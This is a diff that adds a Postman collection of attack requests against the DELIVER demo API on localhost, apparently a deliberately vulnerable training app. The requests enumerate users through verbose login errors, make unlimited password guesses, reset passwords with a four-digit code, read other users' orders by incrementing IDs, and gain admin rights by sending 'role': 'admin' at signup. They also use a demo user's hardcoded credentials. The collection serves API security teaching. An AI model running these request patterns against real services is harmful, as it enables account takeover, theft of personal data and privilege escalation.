@@ -1,0 +1,740 @@
+{
+	"info": {
+		"_postman_id": "f7290a2c-926d-4b1f-9b04-6649810bf819",
+		"name": "DELIVER attacks",
+		"description": "This is a collection that details all the reconnaissance and trial-and-error requests for [DELIVER attacks](https://github.com/jiridj/deliver-attacks).",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "19018100"
+	},
+	"item": [
+		{
+			"name": "Attack #1",
+			"item": [
+				{
+					"name": "Signup as new user",
+					"event": [
+						{
+							"listen": "prerequest",
+							"script": {
+								"exec": [
+									"const email = pm.variables.replaceIn('{{$randomEmail}}');\r",
+									"const password = pm.variables.replaceIn('{{$randomPassword}}');\r",
+									"\r",
+									"pm.collectionVariables.set('email', email);\r",
+									"pm.collectionVariables.set('password', password);"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"email\": \"{{email}}\",\r\n  \"password\": \"{{password}}\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/signup",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"signup"
+							]
+						},
+						"description": "The pre-request script generates a random email address and password for signing up. These values are stored in the collection variables so you can use them throughout your session."
+					},
+					"response": []
+				},
+				{
+					"name": "Login as new user",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return OK', () => {\r",
+									"    pm.response.to.be.ok;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const body = pm.response.json();\r",
+									"    pm.collectionVariables.set('token', body.token);\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"email\": \"{{email}}\",\r\n    \"password\": \"{{password}}\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/login",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"login"
+							]
+						},
+						"description": "Logs in with the new user. You must have executed the `Signup as new user` request first. The response contains a JWT token which is stored in a collection variable to be used in later requests."
+					},
+					"response": []
+				},
+				{
+					"name": "Login as Odille",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return OK', () => {\r",
+									"    pm.response.to.be.ok;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const body = pm.response.json();\r",
+									"    pm.collectionVariables.set('token', body.token);\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"email\": \"overrillo0@redcross.org\",\r\n    \"password\": \"QkYvxNZUiP\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/login",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"login"
+							]
+						},
+						"description": "Logs in as one of the pre-loaded demo users. This user has a complete profile, including PII and payment information."
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Attack #2",
+			"item": [
+				{
+					"name": "Login with wrong email",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return Unauthorized', () => {\r",
+									"    pm.response.to.be.unauthorized;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const body = pm.response.json();\r",
+									"    pm.expect(body.message).to.equal('Wrong email address');\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"email\": \"doesnotexist@deliver.api\",\r\n    \"password\": \"password123#\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/login",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"login"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Login with wrong password",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return Unauthorized', () => {\r",
+									"    pm.response.to.be.unauthorized;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const body = pm.response.json();\r",
+									"    pm.expect(body.message).to.equal('Wrong password');\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"email\": \"overrillo0@redcross.org\",\r\n    \"password\": \"password123#\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/login",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"login"
+							]
+						},
+						"description": "Tries to log in with a wrong password. The response contains a verbose error message."
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Attack #3",
+			"item": [
+				{
+					"name": "Login with wrong password",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return Unauthorized', () => {\r",
+									"    pm.response.to.be.unauthorized;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const body = pm.response.json();\r",
+									"    pm.expect(body.message).to.equal('Wrong password');\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"email\": \"overrillo0@redcross.org\",\r\n    \"password\": \"password123#\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/login",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"login"
+							]
+						},
+						"description": "Tries to log in with a wrong password. There is no restriction on how often you can try."
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Attack #4",
+			"item": [
+				{
+					"name": "Request password reset",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"email\": \"{{email}}\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/reset",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"reset"
+							]
+						},
+						"description": "Requests a password reset for the user previously signed up by calling `Signup as new user`.\n\nA four digit one-time password will be set on the user object which can be used to reset the password. You can get the four digit code from the debug logs of the API container."
+					},
+					"response": []
+				},
+				{
+					"name": "Reset password",
+					"event": [
+						{
+							"listen": "prerequest",
+							"script": {
+								"exec": [
+									"const password = pm.variables.replaceIn('{{$randomPassword}}');\r",
+									"pm.collectionVariables.set('password', password);"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n    \"email\": \"{{email}}\",\r\n    \"password\": \"{{password}}\",\r\n    \"one_time_password\": \"4754\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/reset",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"reset"
+							]
+						},
+						"description": "Resets the password using the four digit one-time password generated during the previous request. Get the four digit code from the API container logs."
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Attack #5",
+			"item": [
+				{
+					"name": "Get own user profile",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{token}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": ""
+						},
+						"url": {
+							"raw": "{{baseUrl}}/user",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"user"
+							]
+						},
+						"description": "Retrieves the user profile of the logged in user. You should be logged in with the user previously created in `Attack #1`."
+					},
+					"response": []
+				},
+				{
+					"name": "Get Odille user profile (try 1)",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{token}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": ""
+						},
+						"url": {
+							"raw": "{{baseUrl}}/user/overrillo0@redcross.org",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"user",
+								"overrillo0@redcross.org"
+							]
+						},
+						"description": "Attempts to get the user profile for another user than the logged in one. This is trial-and-error and this method fails."
+					},
+					"response": []
+				},
+				{
+					"name": "Get Odille user profile (try 2)",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{token}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": ""
+						},
+						"url": {
+							"raw": "{{baseUrl}}/user?email=overrillo0@redcross.org",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"user"
+							],
+							"query": [
+								{
+									"key": "email",
+									"value": "overrillo0@redcross.org"
+								}
+							]
+						},
+						"description": "Attempts to get the user profile for another user than the logged in one. We do get a user profile in the response, but it is the logged in user."
+					},
+					"response": []
+				},
+				{
+					"name": "Get order history",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return Ok', () => {\r",
+									"    pm.response.to.be.ok;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const body = pm.response.json();\r",
+									"    pm.expect(body[0].number).to.equal(2234);\r",
+									"    pm.collectionVariables.set('next_order', 2234);\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{token}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseUrl}}/order",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"order"
+							]
+						},
+						"description": "Gets the order history for the user. If you have not created any orders with the new user created in `Attack #1`, you can `Log in as Odille`. They have a order history."
+					},
+					"response": []
+				},
+				{
+					"name": "Get details for order 2234",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return Ok', () => {\r",
+									"    pm.response.to.be.ok;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const body = pm.response.json();\r",
+									"    pm.expect(body.number).to.equal(2234);\r",
+									"    pm.collectionVariables.set('next_order', 2235);\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{token}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseUrl}}/order/2234",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"order",
+								"2234"
+							]
+						},
+						"description": "Gets the details for the first order placed by Odille."
+					},
+					"response": []
+				},
+				{
+					"name": "Get details for next order",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"pm.test('Must return Ok', () => {\r",
+									"    pm.response.to.be.ok;\r",
+									"    pm.response.to.be.withBody;\r",
+									"    pm.response.to.be.json;\r",
+									"\r",
+									"    const order = pm.collectionVariables.get('next_order');\r",
+									"    const body = pm.response.json();\r",
+									"    pm.expect(body.number).to.equal(order);\r",
+									"    pm.collectionVariables.set('next_order', order + 1);\r",
+									"})"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{token}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{baseUrl}}/order/{{next_order}}",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"order",
+								"{{next_order}}"
+							]
+						},
+						"description": "We increment the order number from here. These are no longer orders placed by Odille."
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Attack #6",
+			"item": [
+				{
+					"name": "Signup as admin (try 1 - no effect)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"email\": \"admin_try1@gmail.com\",\r\n  \"password\": \"password123#\",\r\n  \"admin\": true\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/signup",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"signup"
+							]
+						},
+						"description": "Try to sign up as an admin user by setting a property `admin: true`. This has no effect."
+					},
+					"response": []
+				},
+				{
+					"name": "Signup as admin (try 2 - success)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"email\": \"admin_try2@gmail.com\",\r\n  \"password\": \"password123#\",\r\n  \"role\": \"admin\"\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/auth/signup",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"auth",
+								"signup"
+							]
+						},
+						"description": "Try to sign up as an admin user by setting a property `role: 'admin'`. This works and when you use the user to log into the web application you'll have access to the admin menu."
+					},
+					"response": []
+				}
+			]
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "baseUrl",
+			"value": "http://localhost:3333",
+			"type": "string"
+		},
+		{
+			"key": "email",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "password",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "token",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "next_order",
+			"value": "2234",
+			"type": "string"
+		}
+	]
+}
